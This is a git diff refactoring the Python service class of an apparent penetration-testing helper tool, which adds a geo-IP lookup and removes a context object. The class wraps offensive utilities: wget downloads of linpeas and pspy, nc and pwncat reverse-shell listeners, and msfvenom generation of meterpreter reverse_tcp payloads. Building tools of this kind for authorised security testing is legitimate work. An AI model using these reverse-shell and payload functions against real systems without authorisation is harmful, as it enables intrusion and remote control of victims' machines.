@@ -1,13 +1,15 @@
+import json
 import logging
-import sys
 from enum import Enum
-from typing import Union
+from typing import List, Union
 
 import verboselogs
 
 from ..utils.defaultLogBanner import log_runBanner
-from ..utils.utils import Context, Utils
+from ..utils.locater import Locator
+from ..utils.utilsFolderHelper import create_service_folder
 from ..utils.utilsHelper import get_ip_address
+from ..utils.utilsProcessHelper import run_command_endless, run_command_output_loop
 
 
 # ------------------------------------------------------------------------------
@@ -28,31 +30,49 @@ class ToolService:
     #
     #
     # --------------------------------------------------------------------------
-    def __init__(self, ctx: Context):
+    def __init__(self):
         '''
             tools service
         '''
-        if ctx is not None and ctx.utils is not None:
-            self.ctx: Context = ctx
-            self.utils: Utils = ctx.utils
-            logging.log(logging.DEBUG, 'tool-service is initiated')
-        else:
-            logging.log(logging.ERROR, 'context or utils are not set')
-            sys.exit(1)
-
+        logging.log(logging.DEBUG, 'tool-service is initiated')
 
     # --------------------------------------------------------------------------
     #
     #
     #
     # --------------------------------------------------------------------------
+
+    def geo(self, host: str) -> None:
+        '''
+            ...
+        '''
+        service_name: str = 'GEO'
+        log_runBanner(service_name)
+        path: str = create_service_folder('geo', host)
+
+        data = Locator().query(ip=host)
+        if data is not None:
+            with open(f'{path}/geo.log', "w") as r:
+                r.write(json.dumps(data, indent=4))
+
+            logging.log(
+                verboselogs.SUCCESS,
+                f'[*] {service_name} Done! View the log reports under {path}/',
+            )
+
+    # --------------------------------------------------------------------------
+    #
+    #
+    #
+    # --------------------------------------------------------------------------
+
     def download(self, what: DownloadWhat) -> None:
         '''
             ...
         '''
         service_name: str = 'WGET'
         log_runBanner(service_name)
-        path: str = self.utils.create_service_folder('download')
+        path: str = create_service_folder('download')
         url: Union[str, None] = None
         hint: Union[str, None] = None
         if what == DownloadWhat.LINPEAS:
@@ -63,7 +83,7 @@ class ToolService:
             url = 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64'
             hint = f'run example: {path}/pspy64 -pfc -i 100'
         if url is not None:
-            self.utils.run_command_output_loop(f'wget...', [['wget', url, '-P', path]])
+            run_command_output_loop(f'wget...', [['wget', url, '-P', path]])
             if hint is not None:
                 logging.log(logging.INFO, hint)
         logging.log(
@@ -71,18 +91,17 @@ class ToolService:
             f'[*] {service_name} Done! View the log reports under {path}/',
         )
 
-
     # --------------------------------------------------------------------------
     #
     #
     #
     # --------------------------------------------------------------------------
     # TODO: add usfull command, to not need to remember all :D
+
     def info_list(self) -> None:
         '''
             ...
         '''
-
 
     # REVERSE SHELL
     # - start listener
@@ -112,13 +131,13 @@ class ToolService:
         '''
         service_name = 'NC'
         log_runBanner(service_name)
-        path = self.utils.create_service_folder('tool/nc')
+        path = create_service_folder('tool/nc')
         use_sudo = []
         if port <= 1024:
             use_sudo = ['sudo']
         cmd = use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)]
         log_runBanner(f'pwncat listening...')
-        self.utils.run_command_endless(command_list=cmd)
+        run_command_endless(command_list=cmd)
         logging.log(
             verboselogs.SUCCESS,
             f'[*] {service_name} Done! View the log reports under {path}/',
@@ -130,7 +149,7 @@ class ToolService:
         '''
         service_name = 'PWNCAT'
         log_runBanner(service_name)
-        path = self.utils.create_service_folder('tool/pwncat')
+        path = create_service_folder('tool/pwncat')
         if host is None:
             host = get_ip_address()
         if host is not None:
@@ -146,7 +165,7 @@ class ToolService:
                 '-vv', '--self-inject', f'/bin/sh:{host}:{port}'
             ]
             log_runBanner(f'pwncat listening...')
-            self.utils.run_command_endless(command_list=cmd)
+            run_command_endless(command_list=cmd)
             logging.log(
                 verboselogs.SUCCESS,
                 f'[*] {service_name} Done! View the log reports under {path}/',
@@ -154,12 +173,12 @@ class ToolService:
         else:
             logging.log(logging.ERROR, 'missing host')
 
+    # --------------------------------------------------------------------------
+    #
+    #
+    #
+    # --------------------------------------------------------------------------
 
-    # --------------------------------------------------------------------------
-    #
-    #
-    #
-    # --------------------------------------------------------------------------
     def msfvenom(
         self,
         host: str,
@@ -173,11 +192,12 @@ class ToolService:
         '''
         service_name = 'MSFVENOM'
         log_runBanner(service_name)
-        path = self.utils.create_service_folder('tool/msfvenom')
+        path = create_service_folder('tool/msfvenom')
         if file_arch == '32':
             arch = 'x86'
         else:
             arch = 'x64'
+        reverse_payload = []
         if os == 'linux':
             # reverse_payload = ['-p', f'linux/{arch}/shell_reverse_tcp']
             reverse_payload = ['-p', f'linux/{arch}/meterpreter/reverse_tcp']
@@ -186,7 +206,7 @@ class ToolService:
             reverse_payload = ['-p', f'windows/{arch}/meterpreter/reverse_tcp']
         reverse_format = ['-f', format]
         reverse_arch = [f'-a{arch}']
-        self.utils.run_command_output_loop(
+        run_command_output_loop(
             f'msfvenom create reverse shell...',
             [
                 ['msfvenom'] +
@@ -206,20 +226,20 @@ class ToolService:
             f'[*] {service_name} Done! View the log reports under {path}/',
         )
 
+    # --------------------------------------------------------------------------
+    #
+    #
+    #
+    # --------------------------------------------------------------------------
 
-    # --------------------------------------------------------------------------
-    #
-    #
-    #
-    # --------------------------------------------------------------------------
     def pywhat(self, file: str) -> None:
         '''
             ...
         '''
         service_name = 'PYWHAT'
         log_runBanner(service_name)
-        path = self.utils.create_service_folder('tool/pywhat')
-        self.utils.run_command_output_loop(
+        path = create_service_folder('tool/pywhat')
+        run_command_output_loop(
             f'extract file...', [['pywhat', file], ['tee', f'{path}/pywhat.log']]
         )
         logging.log(
@@ -227,19 +247,20 @@ class ToolService:
             f'[*] {service_name} Done! View the log reports under {path}/',
         )
 
+    # --------------------------------------------------------------------------
+    #
+    #
+    #
+    # --------------------------------------------------------------------------
 
-    # --------------------------------------------------------------------------
-    #
-    #
-    #
-    # --------------------------------------------------------------------------
     def extract(self, file: str) -> None:
         '''
             ...
         '''
         service_name = 'EXTRACT'
         log_runBanner(service_name)
-        path = self.utils.create_service_folder('tool/extract')
+        path = create_service_folder('tool/extract')
+        extract_type: Union[List[str], None] = None
         if '.tar.bz2' in file:
             extract_type = ['tar', 'xjf']
         if '.tar.gz' in file:
@@ -266,7 +287,8 @@ class ToolService:
             extract_type = ['7z', 'x']
         if '.exe' in file:
             extract_type = ['7z', 'x']
-        self.utils.run_command_output_loop(f'extract file...', [extract_type + [file]])
+        if extract_type is not None:
+            run_command_output_loop(f'extract file...', [extract_type + [file]])
         logging.log(
             verboselogs.SUCCESS,
             f'[*] {service_name} Done! View the log reports under {path}/',
